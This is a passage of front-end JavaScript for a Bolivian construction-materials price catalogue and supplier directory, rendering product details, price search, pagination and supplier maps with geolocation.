                </div>
                <div class="group-variants" id="group-variants-${g.id}" style="display:none">
                    ${(g.insumos || []).map(i => `
                        <div class="variant-row" onclick="openProduct(${i.id})" style="cursor:pointer">
                            <span class="variant-name">${esc(i.name)}${i.spec_url ? ` <a href="${esc(safeUrl(i.spec_url))}" target="_blank" rel="noopener" class="spec-link" onclick="event.stopPropagation()" title="Ficha tecnica">${icon('file-text',12)}</a>` : ''}</span>
                            <span style="display:flex;align-items:center;gap:6px">
                                <span class="variant-price">${i.ref_price ? i.ref_price.toFixed(2) : '--.--'} <span class="price-currency">${esc(i.ref_currency || 'BOB')}</span></span>
                                ${state.user ? `<button class="btn-cart-add btn-cart-sm" onclick="event.stopPropagation();addToCart(${i.id || 'null'},'${escJs(i.name)}','${escJs(i.uom||'')}',${i.ref_price||'null'})" title="Agregar al carrito">${icon('plus',12)}</button>` : ''}
                            </span>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

function toggleGroupVariants(groupId) {
    const variants = document.getElementById(`group-variants-${groupId}`);
    const iconEl = document.getElementById(`group-icon-${groupId}`);
    if (!variants) return;
    const showing = variants.style.display !== 'none';
    variants.style.display = showing ? 'none' : 'block';
    if (iconEl) iconEl.innerHTML = showing ? icon('chevron-down', 16) : icon('chevron-up', 16);
}

function openProduct(id) {
    if (!id) return;
    // Desktop: overlay modal keeps search context. Mobile: route to /p/{id}.
    const isDesktop = window.matchMedia('(min-width: 768px)').matches;
    if (isDesktop) {
        showProductModal(id);
    } else {
        navigate('productDetail', { id });
    }
}

async function _fetchProductData(id) {
    const [detail, suppliers] = await Promise.all([
        API.publicInsumoDetail(id),
        API.publicInsumoSuppliers(id),
    ]);
    if (!detail.ok || !detail.data) return null;
    return {
        data: detail.data,
        suppliers: (suppliers && suppliers.ok) ? suppliers.data : [],
    };
}

function _renderProductDetailHtml(p, sups, opts = {}) {
    const inModal = !!opts.inModal;
    const priceTxt = p.ref_price
        ? `${p.ref_price.toFixed(2)} <span class="pd-currency">${esc(p.ref_currency || 'BOB')}</span>`
        : '<span class="pd-no-price">Precio bajo consulta</span>';
    const uomTxt = p.uom ? `<span class="pd-unit">/ ${esc(p.uom)}</span>` : '';

    const specBtn = p.spec_url
        ? `<a href="${esc(safeUrl(p.spec_url))}" target="_blank" rel="noopener" class="btn btn-secondary pd-spec-btn">${icon('file-text', 14)} Ficha tecnica</a>`
        : '';

    const regionalHtml = (p.regional_prices || []).length > 0
        ? `<div class="pd-section">
               <h3 class="pd-section-title">Precios por region</h3>
               <div class="pd-regional-grid">
                   ${p.regional_prices.map(r => `
                       <div class="pd-regional-item">
                           <div class="pd-regional-name">${esc(r.region)}</div>
                           <div class="pd-regional-price">${r.price.toFixed(2)} <span class="pd-currency">${esc(r.currency || 'BOB')}</span></div>
                           ${r.sample_count > 1 ? `<div class="pd-regional-hint">${r.sample_count} cotizaciones</div>` : ''}
                       </div>
                   `).join('')}
               </div>
           </div>`
        : '';

    const groupHtml = (p.group && p.group.siblings && p.group.siblings.length > 0)
        ? `<div class="pd-section">
               <h3 class="pd-section-title">${p.group.variant_label ? esc(p.group.variant_label) + 's' : 'Variantes'} de la familia: ${esc(p.group.name)}</h3>
               <div class="pd-variants">
                   ${p.group.siblings.map(s => `
                       <div class="pd-variant-row" onclick="openProduct(${s.id})">
                           <span class="pd-variant-name">${esc(s.name)}</span>
                           <span class="pd-variant-price">${s.ref_price ? s.ref_price.toFixed(2) : '--.--'} <span class="pd-currency">${esc(s.ref_currency || 'BOB')}</span></span>
                       </div>
                   `).join('')}
               </div>
           </div>`
        : '';

    const supHtml = sups.length > 0
        ? `<div class="pd-section">
               <div class="pd-section-head">
                   <h3 class="pd-section-title">${sups.length} proveedor${sups.length > 1 ? 'es' : ''} lo ofrece${sups.length > 1 ? 'n' : ''}</h3>
                   <button class="btn btn-secondary btn-sm" onclick="findSuppliersNearForProduct(${p.id}, '${escJs(p.category || '')}', ${inModal ? 'true' : 'false'}, '${escJs(p.name || '')}')">
                       ${icon('map-pin', 14)} Cerca de mi
                   </button>
               </div>
               <div class="pd-suppliers">
                   ${sups.map(s => {
                       const loc = [s.city, s.department].filter(Boolean).join(', ');
                       const wa = s.whatsapp ? `<a href="https://wa.me/${String(s.whatsapp).replace(/[^0-9]/g,'')}" target="_blank" rel="noopener" class="pd-sup-wa" onclick="event.stopPropagation()">${icon('whatsapp', 14)} WhatsApp</a>` : '';
                       return `
                           <div class="pd-sup-card" onclick="${inModal ? 'closeModal();' : ''}showPublicSupplierDetail(${s.supplier_id})">
                               <div class="pd-sup-info">
                                   <div class="pd-sup-name">${esc(s.supplier_name)}</div>
                                   <div class="pd-sup-meta">${loc ? icon('map-pin', 12) + ' ' + esc(loc) : ''} ${s.order_count > 0 ? ' &middot; ' + s.order_count + ' pedido' + (s.order_count > 1 ? 's' : '') : ''}</div>
                               </div>
                               ${wa}
                           </div>
                       `;
                   }).join('')}
               </div>
           </div>`
        : `<div class="pd-section">
               <div class="pd-section-head">
                   <p class="pd-empty-hint">Aun no hay proveedores registrados para este producto.</p>
                   <button class="btn btn-secondary btn-sm" onclick="findSuppliersNearForProduct(${p.id}, '${escJs(p.category || '')}', ${inModal ? 'true' : 'false'}, '${escJs(p.name || '')}')">
                       ${icon('map-pin', 14)} Buscar cerca de mi
                   </button>
               </div>
           </div>`;

    const relHtml = (p.related || []).length > 0
        ? `<div class="pd-section">
               <h3 class="pd-section-title">Otros productos de ${esc(p.category || 'la categoria')}</h3>
               <div class="pd-related">
                   ${p.related.map(r => `
                       <div class="pd-related-card" onclick="openProduct(${r.id})">
                           <div class="pd-related-name">${esc(r.name)}</div>
                           <div class="pd-related-price">${r.ref_price ? r.ref_price.toFixed(2) : '--.--'} <span class="pd-currency">${esc(r.ref_currency || 'BOB')}</span>${r.uom ? ' / ' + esc(r.uom) : ''}</div>
                       </div>
                   `).join('')}
               </div>
           </div>`
        : '';

    const disclaimerHtml = `
        <div class="pd-disclaimer">
            ${icon('info', 14)}
            <span>Precio <strong>referencial</strong>, actualizado periodicamente. Puede variar segun zona, temporada, volumen o condiciones del proveedor.
            <strong>No constituye una oferta vinculante</strong>: para precio en firme, contacta al proveedor y solicita cotizacion.
            <a href="#" onclick="event.preventDefault();${inModal ? 'closeModal();' : ''}navigate('legal')">Ver terminos completos</a>.</span>
        </div>`;

    const breadcrumbHtml = inModal ? '' : `
        <div class="pd-breadcrumb">
            <a href="#" onclick="event.preventDefault();navigate('home')">Inicio</a>
            <span>&rsaquo;</span>
            <a href="#" onclick="event.preventDefault();navigate('prices')">Precios</a>
            ${p.category ? `<span>&rsaquo;</span><a href="#" onclick="event.preventDefault();state.searchQuery='';state.selectedCategory='${escJs(p.category)}';navigate('prices')">${esc(p.category)}</a>` : ''}
        </div>`;

    const canEdit = isManager();
    // Imagen: solo se muestra si existe. Se ubica al final del detalle.
    // Los managers pueden subir/cambiar la imagen via el boton pequeno en el
    // encabezado.
    const imgSectionHtml = p.image_url
        ? `<div class="pd-image-section">
               <img src="${esc(safeUrl(p.image_url))}" alt="${esc(p.name)}" loading="lazy">
               ${canEdit ? `<button class="pd-img-edit" onclick="openInsumoImageUpload(${p.id})" title="Cambiar imagen">${icon('edit', 14)}</button>` : ''}
           </div>`
        : '';
    const imgUploadBtn = (canEdit && !p.image_url)
        ? `<button class="btn btn-secondary btn-sm pd-img-upload-btn" onclick="openInsumoImageUpload(${p.id})">${icon('image', 14)} Subir imagen</button>`
        : '';

    return `
        <div class="product-detail${inModal ? ' product-detail-modal' : ''}">
            ${breadcrumbHtml}
            <div class="pd-hero">
                <div class="pd-hero-main">
                    <h1 class="pd-title">${esc(p.name)}</h1>
                    <div class="pd-meta">
                        ${p.category ? `<span class="pd-chip">${icon('tag', 12)} ${esc(p.category)}</span>` : ''}
                        ${p.subcategory ? `<span class="pd-chip">${esc(p.subcategory)}</span>` : ''}
                        <span class="pd-chip">${icon('layers', 12)} ${esc(p.uom || '-')}</span>
                        ${p.code ? `<span class="pd-chip pd-chip-mono">${esc(p.code)}</span>` : ''}
                    </div>
                    ${p.description ? `<p class="pd-description">${esc(p.description)}</p>` : ''}
                </div>
                <div class="pd-hero-side">
                    <div class="pd-price-big">${priceTxt} ${uomTxt}</div>
                    <div class="pd-price-hint">Precio de referencia</div>
                    <div class="pd-actions">
                        ${specBtn}
                        ${state.user ? `<button class="btn btn-primary" onclick="addToCart(${p.id},'${escJs(p.name)}','${escJs(p.uom||'')}',${p.ref_price||'null'})">${icon('plus', 14)} Agregar al carrito</button>` : ''}
                        ${imgUploadBtn}
                    </div>
                </div>
            </div>

            ${regionalHtml}
            ${groupHtml}
            ${supHtml}
            ${relHtml}
            ${imgSectionHtml}
            ${disclaimerHtml}
        </div>
    `;
}

// ── Render: Product Detail (/p/{id} — mobile / direct URL) ─────
async function renderProductDetail() {
    const page = document.getElementById('page-content');
    const id = state.currentParams && state.currentParams.id;
    if (!id) { navigate('home'); return; }

    page.innerHTML = `<div class="product-detail-loading">${icon('clock', 20)} Cargando producto...</div>`;

    let result;
    try {
        result = await _fetchProductData(id);
    } catch (e) {
        page.innerHTML = `<div class="empty-state">${icon('x', 32)}<p>Error al cargar el producto</p><button class="btn" onclick="navigate('prices')">Volver a Precios</button></div>`;
        return;
    }
    if (!result) {
        page.innerHTML = `<div class="empty-state">${icon('layers', 32)}<p>Producto no encontrado</p><button class="btn" onclick="navigate('prices')">Ver todos los precios</button></div>`;
        return;
    }

    page.innerHTML = _renderProductDetailHtml(result.data, result.suppliers, { inModal: false });
    document.title = `${result.data.name} — Precio en Bolivia | Nexo Base`;
}

// ── Modal: Product Detail (desktop) ────────────────────────────
async function showProductModal(id) {
    const existing = document.querySelector('.modal-overlay');
    if (existing) existing.remove();
    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay modal-overlay-product';
    overlay.onclick = (e) => { if (e.target === overlay) closeModal(); };
    overlay.innerHTML = `
        <div class="modal modal-product">
            <button class="modal-close modal-close-floating" onclick="closeModal()" aria-label="Cerrar">&times;</button>
            <div class="modal-body" id="product-modal-body">
                <div class="product-detail-loading">${icon('clock', 20)} Cargando producto...</div>
            </div>
        </div>
    `;
    document.body.appendChild(overlay);

    let result;
    try {
        result = await _fetchProductData(id);
    } catch {
        document.getElementById('product-modal-body').innerHTML =
            `<div class="empty-state">${icon('x', 32)}<p>Error al cargar el producto</p></div>`;
        return;
    }
    if (!result) {
        document.getElementById('product-modal-body').innerHTML =
            `<div class="empty-state">${icon('layers', 32)}<p>Producto no encontrado</p></div>`;
        return;
    }
    const body = document.getElementById('product-modal-body');
    if (body) body.innerHTML = _renderProductDetailHtml(result.data, result.suppliers, { inModal: true });
}

// ── Product: Find suppliers near me (by insumo_id or category) ─
function findSuppliersNearForProduct(insumoId, category, fromModal, insumoName) {
    if (fromModal) closeModal();
    navigate('suppliers', {
        insumoId,
        insumoName: insumoName || '',
        category: category || '',
        openMap: true,
        useGeo: true,
    });
}


// ── Admin: Upload product image ────────────────────────────────
function openInsumoImageUpload(insumoId) {
    if (!isManager()) return;
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'image/jpeg,image/png,image/webp';
    input.onchange = async () => {
        const file = input.files && input.files[0];
        if (!file) return;
        if (file.size > 5 * 1024 * 1024) {
            toast('La imagen excede 5 MB', 'error');
            return;
        }
        const fd = new FormData();
        fd.append('file', file);
        toast('Subiendo imagen...', 'info');
        const res = await API.uploadInsumoImage(insumoId, fd);
        if (res.ok) {
            toast('Imagen actualizada', 'success');
            const modalOpen = document.querySelector('.modal-overlay-product');
            if (modalOpen) {
                showProductModal(insumoId);
            } else if (state.currentPage === 'productDetail') {
                renderProductDetail();
            }
        } else {
            toast(res.detail || 'Error al subir imagen', 'error');
        }
    };
    input.click();
}

// ── Render: Public Prices page ─────────────────────────────────
async function renderPublicPrices() {
    const page = document.getElementById('page-content');
    page.innerHTML = `
        <div class="page-header">
            <h1 class="page-title">Precios de Materiales</h1>
            <p class="page-subtitle">Catalogo publico de precios unitarios de construccion</p>
        </div>
        <div class="search-bar">
            <input class="form-input" id="price-search" placeholder="Buscar material, insumo..."
                   value="${esc(state.searchQuery)}" oninput="debouncePriceSearch()">
            <button class="btn btn-secondary" onclick="openMaterialSuppliersMap()" title="Ver proveedores del material buscado en el mapa">
                ${icon('map-pin',16)} Proveedores en mapa
            </button>
        </div>
        <div class="categories-bar" id="price-categories"></div>
        <div id="prices-list"><div class="empty-state"><p>Cargando...</p></div></div>
        <div id="prices-pagination" style="text-align:center;margin-top:16px"></div>
    `;

    loadPriceCategories();

    if (state.searchQuery.length >= 2) {
        searchPublicPrices(state.searchQuery);
    } else {
        loadPublicPrices();
    }
}

async function loadPriceCategories() {
    try {
        const resp = await API.priceCategories();
        if (resp.ok && resp.data.length) {
            const container = document.getElementById('price-categories');
            container.innerHTML = `
                <span class="chip${!state.selectedCategory ? ' active' : ''}" onclick="filterPriceCategory(null)">Todos</span>
                ${resp.data.map(c => `
                    <span class="chip${state.selectedCategory === c.name ? ' active' : ''}"
                          onclick="filterPriceCategory('${escJs(c.name)}')">${esc(c.name)} (${c.count})</span>
                `).join('')}
            `;
        }
    } catch {}
}

function filterPriceCategory(cat) {
    state.selectedCategory = cat;
    state.searchQuery = '';
    const searchInput = document.getElementById('price-search');
    if (searchInput) searchInput.value = '';
    loadPriceCategories();
    loadPublicPrices();
}

// ── Side map: suppliers matching current material search ──────
// Cambio: en vez de abrir modal flotante, navegamos a Proveedores con
// filtro + mapa activo, para que la experiencia ocurra en la ventana actual.
function openMaterialSuppliersMap() {
    const q = (document.getElementById('price-search')?.value || '').trim();
    const cat = state.selectedCategory || '';
    navigate('suppliers', {
        q,
        category: cat,
        openMap: true,
        useGeo: true,
    });
}

let _priceTimer;
function debouncePriceSearch() {
    clearTimeout(_priceTimer);
    _priceTimer = setTimeout(() => {
        const q = document.getElementById('price-search')?.value?.trim() || '';
        state.searchQuery = q;
        if (q.length >= 2) {
            searchPublicPrices(q);
        } else {
            loadPublicPrices();
        }
    }, 350);
}

async function loadPublicPrices(offset = 0) {
    let params = `?offset=${offset}&limit=30`;
    if (state.selectedCategory) params += `&category=${encodeURIComponent(state.selectedCategory)}`;

    try {
        const resp = await API.publicGroupedPrices(params);
        const container = document.getElementById('prices-list');
        if (!resp.ok) { container.innerHTML = '<div class="empty-state"><p>Error cargando precios</p></div>'; return; }
        if (!resp.data.length) { container.innerHTML = '<div class="empty-state"><p>No se encontraron materiales</p></div>'; return; }

        container.innerHTML = `
            <div class="price-grid">${resp.data.map(renderPriceCard).join('')}</div>
        `;
        renderPagination(resp.total, offset, 30, loadPublicPrices);
    } catch { document.getElementById('prices-list').innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>'; }
}

async function searchPublicPrices(q) {
    try {
        // 1) Smart-search (embeddings + fallback) — mejor UX cuando hay sinonimos
        const smart = await API.smartSearch(q, state.selectedCategory || null, 50).catch(() => ({ ok: false }));
        const container = document.getElementById('prices-list');

        if (smart.ok && (smart.data?.length || smart.suggestions?.length)) {
            const data = smart.data || [];
            const suggestions = smart.suggestions || [];
            const parts = [];
            if (data.length) {
                parts.push(`
                    <p style="font-size:13px;color:var(--gray-500);margin-bottom:12px">
                        ${data.length} resultado${data.length !== 1 ? 's' : ''} para "${esc(q)}"
                    </p>
                    <div class="price-grid">${data.map(renderPriceCard).join('')}</div>
                `);
            }
            if (!data.length && suggestions.length) {
                parts.push(`
                    <div class="search-suggest-banner" style="margin:12px 0">
                        <div class="search-suggest-title">${icon('search', 16)} No encontramos exactamente "<strong>${esc(q)}</strong>". Quiza buscabas:</div>
                        <div class="search-suggest-chips">
                            ${suggestions.slice(0, 5).map(s => `
                                <span class="search-suggest-chip" onclick="openProduct(${s.id})">
                                    ${esc(s.name)}${s.ref_price ? ` · <strong>Bs ${Number(s.ref_price).toFixed(2)}</strong>/${esc(s.uom || '')}` : ''}
                                </span>
                            `).join('')}
                        </div>
                    </div>
                    <div class="price-grid">${suggestions.map(renderPriceCard).join('')}</div>
                `);
            } else if (suggestions.length) {
                // Cuando hay data, mostrar sugerencias relacionadas al final
                parts.push(`
                    <div style="margin-top:24px;padding-top:16px;border-top:1px solid var(--gray-200)">
                        <p style="font-size:12px;color:var(--gray-500);margin-bottom:8px">Tambien podria interesarte:</p>
                        <div class="search-suggest-chips">
                            ${suggestions.slice(0, 5).map(s => `
                                <span class="search-suggest-chip" onclick="openProduct(${s.id})">
                                    ${esc(s.name)}
                                </span>
                            `).join('')}
                        </div>
                    </div>
                `);
            }
            container.innerHTML = parts.join('');
            document.getElementById('prices-pagination').innerHTML = '';
            return;
        }

        // 2) Fallback a grouped search
        let params = `?q=${encodeURIComponent(q)}&limit=50`;
        if (state.selectedCategory) params += `&category=${encodeURIComponent(state.selectedCategory)}`;
        const resp = await API.publicGroupedPrices(params);
        if (!resp.ok || !resp.data.length) {
            container.innerHTML = `<div class="empty-state"><p>No se encontraron resultados para "${esc(q)}"</p></div>`;
            return;
        }
        const groups = resp.data.filter(i => i.type === 'group').length;
        const standalone = resp.data.filter(i => i.type === 'standalone').length;
        container.innerHTML = `
            <p style="font-size:13px;color:var(--gray-500);margin-bottom:12px">
                ${resp.total} resultados para "${esc(q)}"${groups ? ` (${groups} grupo${groups > 1 ? 's' : ''} + ${standalone} individual${standalone !== 1 ? 'es' : ''})` : ''}
            </p>
            <div class="price-grid">${resp.data.map(renderPriceCard).join('')}</div>
        `;
        document.getElementById('prices-pagination').innerHTML = '';
    } catch {
        document.getElementById('prices-list').innerHTML = '<div class="empty-state"><p>Error buscando</p></div>';
    }
}

function renderPagination(total, offset, limit, loadFn) {
    const container = document.getElementById('prices-pagination');
    if (!container || total <= limit) { if (container) container.innerHTML = ''; return; }

    const pages = Math.ceil(total / limit);
    const current = Math.floor(offset / limit);
    let html = '';
    for (let i = 0; i < pages && i < 10; i++) {
        html += `<button class="btn btn-sm ${i === current ? 'btn-primary' : 'btn-secondary'}"
                         onclick="(${loadFn.name})(${i * limit})" style="min-width:36px">${i + 1}</button> `;
    }
    container.innerHTML = html;
}

// ── Map Utilities ─────────────────────────────────────────────
const MapUtils = {
    _map: null,
    _markers: [],
    createMap(containerId, center = [-16.5, -64.5], zoom = 6) {
        if (this._map) { this._map.remove(); this._map = null; }
        const map = L.map(containerId).setView(center, zoom);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
            maxZoom: 18,
        }).addTo(map);
        this._map = map;
        return map;
    },
    clearMarkers() {
        this._markers.forEach(m => m.remove());
        this._markers = [];
    },
    addMarker(lat, lon, popup, opts = {}) {
        if (!this._map) return null;
        const marker = L.marker([lat, lon]).addTo(this._map);
        if (popup) marker.bindPopup(popup);
        this._markers.push(marker);
        return marker;
    },
    addBranchMarker(lat, lon, popup) {
        if (!this._map) return null;
        const branchIcon = L.divIcon({
            className: 'branch-marker',
            html: '<div style="background:#16a34a;width:12px;height:12px;border-radius:50%;border:2px solid white;box-shadow:0 0 3px rgba(0,0,0,0.4)"></div>',
            iconSize: [16, 16],
            iconAnchor: [8, 8],
        });
        const marker = L.marker([lat, lon], { icon: branchIcon }).addTo(this._map);
        if (popup) marker.bindPopup(popup);
        this._markers.push(marker);
        return marker;
    },
    fitToMarkers() {
        if (!this._map || !this._markers.length) return;
        const group = L.featureGroup(this._markers);
        this._map.fitBounds(group.getBounds().pad(0.1));
    },
};

let _supplierMapMode = false;

// ── Render: Public Suppliers page ──────────────────────────────
async function renderPublicSuppliers() {
    // Deep-link: los params vienen de Precios ("ver proveedores en mapa") o del
    // detalle de producto ("cerca de mi"). Se consumen para no re-aplicar en
    // siguientes renders.
    let queuedGeo = false;
    let deepQ = '';
    if (state.currentParams) {
        const p = state.currentParams;
        if (p.insumoId) {
            state.supplierSearchMode = 'material';
            state.insumoFilter = {
                id: p.insumoId,
                name: p.insumoName || `Material #${p.insumoId}`,
            };
        }
        if (p.q) { state.supplierSearchMode = 'supplier'; deepQ = p.q; }
        if (p.category) state.selectedCategory = p.category;
        if (p.openMap) _supplierMapMode = true;
        if (p.useGeo) queuedGeo = true;
        state.currentParams = null;
    }

    const mode = state.supplierSearchMode || 'supplier';
    const placeholder = mode === 'material'
        ? 'Buscar material (ej: cemento, fierro)...'
        : 'Buscar proveedor por nombre, descripcion o rubro...';

    const filterPill = state.insumoFilter
        ? `<div class="filter-pill">
              ${icon('package', 14)} Proveedores que venden: <strong>${esc(state.insumoFilter.name)}</strong>
              <button class="filter-pill-x" onclick="clearMaterialFilter()" title="Quitar filtro">${icon('x', 14)}</button>
           </div>`
        : '';

    const page = document.getElementById('page-content');
    page.innerHTML = `
        <div class="page-header" style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px">
            <div>
                <h1 class="page-title">Directorio de Proveedores</h1>
                <p class="page-subtitle">Encuentra proveedores de materiales de construccion en Bolivia</p>
            </div>
            ${state.user ? `<button class="btn btn-primary" onclick="showSuggestSupplierModal()">${icon('user-plus',16)} Sugerir Proveedor</button>` : ''}
        </div>
        <div class="search-mode-tabs">
            <button class="search-mode-tab${mode === 'supplier' ? ' active' : ''}" onclick="setSupplierSearchMode('supplier')">
                ${icon('users', 14)} Buscar proveedor
            </button>
            <button class="search-mode-tab${mode === 'material' ? ' active' : ''}" onclick="setSupplierSearchMode('material')">
                ${icon('package', 14)} Buscar por material
            </button>
        </div>
        <div class="search-bar">
            <div style="flex:1;position:relative">
                <input class="form-input" id="supplier-search" placeholder="${placeholder}" oninput="onSupplierSearchInput()" autocomplete="off">
                <div id="material-suggestions" class="material-suggestions" style="display:none"></div>
            </div>
            <select class="form-select" id="supplier-dept-filter" onchange="filterSupplierDept()" style="max-width:180px">
                <option value="">Todos los departamentos</option>
                ${DEPARTMENTS.map(d => `<option value="${d}"${state.selectedDepartment === d ? ' selected' : ''}>${d}</option>`).join('')}
            </select>
            <button class="btn btn-secondary" id="btn-toggle-map" onclick="toggleSupplierMap()" title="Ver en mapa">
                ${icon('map-pin',16)} ${_supplierMapMode ? 'Lista' : 'Mapa'}
            </button>
            <button class="btn btn-secondary" onclick="findNearbySuppliers()" title="Cerca de mi">
                ${icon('map-pin',16)} Cerca de mi
            </button>
        </div>
        <div id="active-filter-pill">${filterPill}</div>
        <div class="categories-bar" id="supplier-categories"></div>
        <div id="supplier-map-container" style="height:450px;border-radius:8px;margin-bottom:16px;display:${_supplierMapMode ? 'block' : 'none'}"></div>
        <div class="supplier-grid" id="suppliers-list" style="display:${_supplierMapMode ? 'none' : 'grid'}">
            <div class="empty-state"><p>Cargando...</p></div>
        </div>
    `;

    // Si llega q por deep-link, preseteamos el input y lanzamos busqueda
    const inputEl = document.getElementById('supplier-search');
    if (inputEl && deepQ) inputEl.value = deepQ;

    loadSupplierCategoryChips();
    loadPublicSuppliers();
    if (_supplierMapMode) {
        MapUtils.createMap('supplier-map-container');
        loadSuppliersOnMap();
        // Cerca de mi en la misma ventana (tras dar tiempo a que el mapa inicie)
        if (queuedGeo) setTimeout(findNearbySuppliers, 200);
    }
}

function setSupplierSearchMode(mode) {
    state.supplierSearchMode = mode;
    // Cerrar sugerencias si cambia de modo
    const sug = document.getElementById('material-suggestions');
    if (sug) { sug.style.display = 'none'; sug.innerHTML = ''; }
    // Re-render del header completo para actualizar tabs + placeholder
    renderPublicSuppliers();
}

function clearMaterialFilter() {
    state.insumoFilter = null;
    const pill = document.getElementById('active-filter-pill');
    if (pill) pill.innerHTML = '';
    loadPublicSuppliers();
    if (_supplierMapMode) loadSuppliersOnMap();
}

let _materialSearchTimer;
function onSupplierSearchInput() {
    const mode = state.supplierSearchMode || 'supplier';
    if (mode === 'material') {
        clearTimeout(_materialSearchTimer);
        _materialSearchTimer = setTimeout(searchMaterialSuggestions, 250);
    } else {
        debounceSupplierSearch();
    }
}

async function searchMaterialSuggestions() {
    const input = document.getElementById('supplier-search');
    const sug = document.getElementById('material-suggestions');
    if (!input || !sug) return;
    const q = input.value.trim();
    if (q.length < 2) { sug.style.display = 'none'; sug.innerHTML = ''; return; }
    try {
        // smart-search combina embeddings (semantico) + trigram fallback
        const resp = await API.smartSearch(q, null, 8);
        const base = (resp && resp.ok) ? [...(resp.data || []), ...(resp.suggestions || [])] : [];
        const seen = new Set();
        const items = base.filter(p => p.id && !seen.has(p.id) && (seen.add(p.id), true)).slice(0, 8);
        if (!items.length) {
            sug.innerHTML = '<div class="material-sug-empty">Sin materiales para ese texto</div>';
            sug.style.display = '';
            return;
        }
        sug.innerHTML = items.map(p => {
            const price = p.ref_price ? `<span class="material-sug-price">${p.ref_price.toFixed(2)} ${esc(p.ref_currency || 'BOB')}</span>` : '';
            return `<div class="material-sug-item" onclick="selectMaterialFilter(${p.id}, '${escJs(p.name)}')">
                <div>
                    <div class="material-sug-name">${esc(p.name)}</div>
                    <div class="material-sug-meta">${p.category ? esc(p.category) : ''}${p.uom ? ' · ' + esc(p.uom) : ''}</div>
                </div>
                ${price}
            </div>`;
        }).join('');
        sug.style.display = '';
    } catch { sug.style.display = 'none'; }
}

function selectMaterialFilter(insumoId, insumoName) {
    state.insumoFilter = { id: insumoId, name: insumoName };
    const sug = document.getElementById('material-suggestions');
    if (sug) { sug.style.display = 'none'; sug.innerHTML = ''; }
    const input = document.getElementById('supplier-search');
    if (input) input.value = '';
    const pill = document.getElementById('active-filter-pill');
    if (pill) {
        pill.innerHTML = `<div class="filter-pill">
            ${icon('package', 14)} Proveedores que venden: <strong>${esc(insumoName)}</strong>
            <button class="filter-pill-x" onclick="clearMaterialFilter()" title="Quitar filtro">${icon('x', 14)}</button>
        </div>`;
    }
    loadPublicSuppliers();
    if (_supplierMapMode) loadSuppliersOnMap();
}

function toggleSupplierMap() {
    _supplierMapMode = !_supplierMapMode;
    const mapEl = document.getElementById('supplier-map-container');
    const listEl = document.getElementById('suppliers-list');
    const btn = document.getElementById('btn-toggle-map');
    if (_supplierMapMode) {
        mapEl.style.display = 'block';
        listEl.style.display = 'none';
        if (btn) btn.innerHTML = `${icon('map-pin',16)} Lista`;
        // Initialize map if not done
        MapUtils.createMap('supplier-map-container');
        loadSuppliersOnMap();
    } else {
        mapEl.style.display = 'none';
        listEl.style.display = 'grid';
        if (btn) btn.innerHTML = `${icon('map-pin',16)} Mapa`;
    }
}

async function loadSuppliersOnMap() {
    const mode = state.supplierSearchMode || 'supplier';
    const q = (mode === 'supplier') ? (document.getElementById('supplier-search')?.value?.trim() || '') : '';
    let params = '?';
    if (q) params += `q=${encodeURIComponent(q)}&`;
    if (state.selectedCategory) params += `category=${encodeURIComponent(state.selectedCategory)}&`;
    if (state.selectedDepartment) params += `department=${encodeURIComponent(state.selectedDepartment)}&`;
    if (state.insumoFilter && state.insumoFilter.id) params += `insumo_id=${state.insumoFilter.id}&`;

    try {
        const resp = await API.publicSuppliersMap(params);
        MapUtils.clearMarkers();
        if (resp.ok && resp.data) {
            resp.data.forEach(s => {
                if (!s.latitude || !s.longitude) return;
                const cats = (s.categories || []).map(c => esc(c)).join(', ');
                const branchLabel = s.is_branch
                    ? `<br><em style="color:var(--primary)">Sucursal: ${esc(s.branch_name || '')}</em>`
                    : '';
                const html =
                    `<strong>${esc(s.name)}</strong>${branchLabel}` +
                    `<br>${esc(s.city || '')} - ${esc(s.department || '')}` +
                    (cats ? `<br><small>${cats}</small>` : '') +
                    `<br><a href="#" onclick="event.preventDefault();showPublicSupplierDetail(${s.supplier_id})">Ver detalle</a>`;
                if (s.is_branch) {
                    MapUtils.addBranchMarker(s.latitude, s.longitude, html);
                } else {
                    MapUtils.addMarker(s.latitude, s.longitude, html);
                }
            });
            MapUtils.fitToMarkers();
        }
    } catch {}
}

async function findNearbySuppliers() {
    if (!navigator.geolocation) {
        toast('Geolocalizacion no disponible en tu navegador', 'error');
        return;
    }
    toast('Obteniendo tu ubicacion...', 'info');
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const { latitude, longitude } = pos.coords;
        try {
            let url = `/suppliers/public/nearby?lat=${latitude}&lon=${longitude}&radius_km=100&limit=30`;
            if (state.insumoFilter && state.insumoFilter.id) url += `&insumo_id=${state.insumoFilter.id}`;
            if (state.selectedCategory) url += `&category=${encodeURIComponent(state.selectedCategory)}`;
            const resp = await API.get(url);
            if (resp.ok && resp.data.length) {
                _supplierMapMode = true;
                const mapEl = document.getElementById('supplier-map-container');
                const listEl = document.getElementById('suppliers-list');
                if (mapEl) mapEl.style.display = 'block';
                if (listEl) listEl.style.display = 'none';
                MapUtils.createMap('supplier-map-container', [latitude, longitude], 11);
                MapUtils.clearMarkers();
                // Add user marker
                L.marker([latitude, longitude], {
                    icon: L.divIcon({ className: 'user-marker', html: '<div style="background:#1e40af;width:14px;height:14px;border-radius:50%;border:3px solid white;box-shadow:0 0 4px rgba(0,0,0,0.3)"></div>', iconSize: [20, 20], iconAnchor: [10, 10] })
                }).addTo(MapUtils._map).bindPopup('Tu ubicacion');
                resp.data.forEach(s => {
                    if (s.latitude && s.longitude) {
                        MapUtils.addMarker(s.latitude, s.longitude,
                            `<strong>${esc(s.name)}</strong><br>${esc(s.city || '')} - ${esc(s.department || '')}<br><em>${s.distance_km} km</em>`
                        );
                    }
                });
                MapUtils.fitToMarkers();
                toast(`${resp.data.length} proveedores encontrados cerca`, 'success');
            } else {
                toast('No se encontraron proveedores cercanos con ubicacion', 'info');
            }
        } catch { toast('Error buscando proveedores cercanos', 'error'); }
    }, () => {
        toast('No se pudo obtener tu ubicacion', 'error');
    });
}

async function loadSupplierCategoryChips() {
    try {
        const resp = await API.supplierCategories();
        if (resp.ok && resp.data.length) {
            const container = document.getElementById('supplier-categories');
            if (!container) return;
            container.innerHTML = `
